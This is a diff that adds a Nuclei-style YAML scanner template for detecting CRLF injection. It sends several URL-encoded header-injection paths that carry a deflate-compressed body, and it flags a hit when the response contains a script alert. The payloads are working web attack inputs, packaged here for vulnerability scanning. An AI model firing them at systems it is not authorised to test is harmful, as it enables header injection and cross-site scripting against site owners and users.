@@ -1,0 +1,37 @@
+id: crlf-injection-deflate
+
+info:
+  name: CRLF - Injection Detection via Deflate
+  author: reewardius
+  severity: medium
+  description: CRLF sequences were not properly sanitized.
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+    - https://github.com/r0075h3ll/Oralyzer/blob/master/core/crlf.py
+    - https://infosecwriteups.com/6000-with-microsoft-hall-of-fame-microsoft-firewall-bypass-crlf-to-xss-microsoft-bug-bounty-8f6615c47922
+  tags: crlf
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%0AContent-Type:%20text/html%0AContent-Encoding:%20deflate%0AContent-Length%2072%0A%0Ax%9C%B3%29N.%CA%2C%28%B1K%CCI-%2A%D1P2T%D2%B4%D1%87%0A%01%00%83%F4%09%2C"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8AContent-Type:%20text/html%0AContent-Encoding:%20deflate%0AContent-Length%2072%0A%0Ax%5Cxda%5Cx93%5Cxef%5Cxe6%60%5Cxe8U%3F%5Cx9a%5Cxca%5Cxf4%5Cx7f%5Cxb3%5Cxa6%5Cx9f%5Cxde%29%5Cx1d%5Cx8d%5Cx8d%5Cxdeg%3Cu%5Cxb5.%5Cx06%5Cx18%5Cx85%5C%5C%5Cxdar%5Cxb1%5Cx9d%5Cx8b%5Cx91%21%5Cxf6%5Cxae%5Cxe5%5Di%5Cx06%5Cx06%5Cx06%5Cx00V%5Cxb4%5Cx0fk"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8AContent-Type:%20text/html%0AContent-Encoding:%20deflate%0AContent-Length%2072%0A%0Ax%9C%B3%29N.%CA%2C%28%B1K%CCI-%2A%D1P2T%D2%B4%D1%87%0A%01%00%83%F4%09%2C"
+      - "{{BaseURL}}/index.html%0AContent-Type:%20text/html%0AContent-Encoding:%20deflate%0AContent-Length%2072%0A%0A%5Cx1f%5Cx8b%5Cx08%5Cx00%5Cx1a%27%5Cxc5e%5Cx02%5Cxff%5Cxab%5Cxb8%5Cxb5Y%5Cxd3O%5Cxef%5Cx94%5Cx8e%5Cxc6F%5Cxef3%5Cx9e%5CxbaZ%5Cx17%5Cx03%5Cx8cB.m%5Cxb9%5Cxd8%5Cxce%5Cxc5%5Cxc8%5Cxd0%5Cxfc%5Cx85S%5Cx07%5Cx00%5Cx07%5Cxc19%5Cxba%5Cx1e%5Cx00%5Cx00%5Cx00"
+      - "{{BaseURL}}/index.html%0AContent-Type:%20text/html%0AContent-Encoding:%20deflate%0AContent-Length%2072%0A%0Ax%9C%B3%29N.%CA%2C%28%B1K%CCI-%2A%D1P2T%D2%B4%D1%87%0A%01%00%83%F4%09%2C"
+      - "{{BaseURL}}/index.html%0D%0AContent-Type:%20text/html%0AContent-Encoding:%20deflate%0AContent-Length%2072%0A%0Ax%9C%B3%29N.%CA%2C%28%B1K%CCI-%2A%D1P2T%D2%B4%D1%87%0A%01%00%83%F4%09%2C"
+      
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'deflate'
+          - 'text/html'
+        condition: and
+        
+      - type: word
+        part: body
+        words:
+          - '<script>alert("1")</script>'
